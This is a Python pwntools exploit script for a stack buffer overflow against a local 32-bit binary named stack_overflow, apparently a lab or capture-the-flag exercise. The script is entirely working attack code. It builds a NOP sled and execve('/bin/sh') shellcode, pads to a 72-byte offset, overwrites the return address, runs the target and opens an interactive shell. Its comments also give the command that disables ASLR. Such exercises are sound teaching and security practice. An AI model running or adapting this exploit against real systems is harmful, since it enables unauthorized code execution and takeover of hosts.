#!/usr/bin/env python3
"""
Stack Buffer Overflow Exploit
Target: stack_overflow (32-bit ELF, NX disabled, no canary, no PIE)
Technique: Overwrite return address with address of shellcode on stack
"""

from pwn import *

# Configuration
binary = ELF('./stack_overflow')
context.arch = 'i386'
context.log_level = 'info'

# Shellcode: execve("/bin/sh", NULL, NULL)
# This spawns a shell
shellcode = asm(shellcraft.sh())

# Exploitation parameters
offset = 72  # Offset to return address (determined via cyclic pattern)
nop_sled = b"\x90" * 20  # NOP sled for reliability

# Calculate return address
# NOTE: This address must be determined dynamically or via GDB
# Example: (gdb) break vulnerable_function
#          (gdb) run AAAA
#          (gdb) x/x $esp
# For demonstration, using a placeholder
# In practice, disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
buffer_addr = 0xffffcf10  # Example address - MUST BE UPDATED FOR YOUR SYSTEM

# Build payload
# [NOP sled][Shellcode][Padding][Return Address]
ret_addr = p32(buffer_addr + 20)  # Point to middle of NOP sled

payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))  # Padding to reach return address
payload += ret_addr  # Overwrite return address

# Display payload info
log.info(f"Shellcode length: {len(shellcode)} bytes")
log.info(f"Total payload length: {len(payload)} bytes")
log.info(f"Return address: {hex(buffer_addr + 20)}")

# Execute exploit
p = process([binary.path, payload])

# Interact with shell
log.success("Exploit sent! Dropping to interactive shell...")
p.interactive()
